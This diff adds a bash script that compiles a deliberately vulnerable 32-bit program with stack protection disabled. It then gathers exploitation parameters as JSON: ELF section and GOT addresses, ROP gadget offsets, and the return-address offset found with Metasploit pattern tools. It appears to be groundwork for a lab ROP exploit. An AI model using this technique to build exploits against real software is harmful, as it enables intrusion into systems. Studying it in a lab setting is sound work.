@@ -1,0 +1,68 @@
+#!/bin/bash
+
+gcc -o vuln vuln.c -g0 -m32 -fomit-frame-pointer -masm=intel -O3 -fno-stack-protector || exit 1
+
+echo '{'
+printf '  "bss": "'
+printf `readelf -S vuln | grep bss | sed 's:\[ :[:' | awk -F' ' '{ print $4 }'`
+echo '",'
+
+printf '  "dynstr": "'
+printf `readelf -S vuln | grep dynstr | sed 's:\[ :[:' | awk -F' ' '{ print $4 }'`
+echo '",'
+
+printf '  "dynsym": "'
+printf `readelf -S vuln | grep dynsym | sed 's:\[ :[:' | awk -F' ' '{ print $4 }'`
+echo '",'
+
+printf '  "rel.plt": "'
+printf `readelf -S vuln | grep 'rel.\plt' | sed 's:\[ :[:' | awk -F' ' '{ print $4 }'`
+echo '",'
+
+printf '  "plt": "'
+printf `readelf -S vuln | grep ' .\plt' | sed 's:\[ :[:' | awk -F' ' '{ print $4 }'`
+echo '",'
+
+printf '  "read_got": "'
+printf `readelf -r vuln | grep '\bread\b' | awk -F' ' '{ print $1 }'`
+echo '",'
+
+printf '  "mem_to_mem": "'
+printf `readelf -s vuln | grep '\bmem_to_mem\b' | awk -F' ' '{ print $2 }'`
+echo '",'
+
+printf '  "writemem": "'
+printf `readelf -s vuln | grep '\bwritemem\b' | awk -F' ' '{ print $2 }'`
+echo '",'
+
+
+printf '  "pointer_to_null": "'
+printf `bgrep '00 00 00 00' vuln | head -n1 | awk -F' ' '{ print $2 }'`
+echo '",'
+
+printf '  "base": "'
+printf `readelf -l vuln  | grep '^\s*[A-Z_]\+\s\+0x' | awk -F' ' '{ print $3 }' | grep -v '^0x0\+$' | sort | head -n1 | sed 's:0x::'`
+echo '",'
+
+printf '  "gadget": "'
+printf `bgrep '5b 5e 5f 5d c3' vuln | head -n1 | awk -F' ' '{ print $2 }'`
+echo '",'
+
+printf '  "leave_ret": "'
+printf `bgrep 'c9 c3' vuln | head -n1 | awk -F' ' '{ print $2 }'`
+echo '",'
+
+printf '  "pop_ebp": "'
+printf `bgrep '5d c3' vuln | head -n1 | awk -F' ' '{ print $2 }'`
+echo '",'
+
+ruby19 /usr/lib64/metasploit4.9/tools/pattern_create.rb 256 | ./vuln
+printf '  "sip_offset": "'
+printf `ruby19 /usr/lib64/metasploit4.9/tools/pattern_offset.rb $(dmesg | tail -n1 | sed 's:.*at\s*\([0-9a-zA-Z]\+\)\s.*:\1:') 256 | sed 's:.*\s\([0-9]\+\)$:\1:'`
+echo '",'
+
+printf '  "add": "'
+printf `readelf -s vuln | grep '\badd\b' | awk -F' ' '{ print $2 }'`
+echo '"'
+
+echo '}'
